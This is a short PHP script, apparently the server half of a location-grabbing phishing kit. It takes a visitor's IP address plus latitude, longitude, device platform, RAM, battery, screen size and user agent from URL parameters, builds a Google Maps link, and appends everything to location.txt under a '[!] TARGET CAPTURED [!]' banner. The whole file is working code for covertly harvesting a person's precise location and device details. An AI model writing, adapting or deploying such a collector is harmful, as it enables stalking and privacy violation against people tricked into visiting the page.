<?php
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");

// Google Maps Link Creation
$map_link = "https://www.google.com/maps?q=" . $_GET['lat'] . "," . $_GET['lon'];

$report = "\n--------------------------------------------------\n";
$report .= "[!] TARGET CAPTURED [!]\n";
$report .= "Date      : $date\n";
$report .= "IP        : $ip\n";
$report .= "Location  : " . $_GET['lat'] . ", " . $_GET['lon'] . "\n";
$report .= "Map Link  : $map_link\n";
$report .= "Device    : " . $_GET['platform'] . " (RAM: " . $_GET['ram'] . ")\n";
$report .= "Battery   : " . $_GET['battery'] . "\n";
$report .= "Screen    : " . $_GET['screen'] . "\n";
$report .= "OS Agent  : " . $_GET['agent'] . "\n";
$report .= "--------------------------------------------------\n";

file_put_contents('location.txt', $report, FILE_APPEND);
echo "Captured";
?>

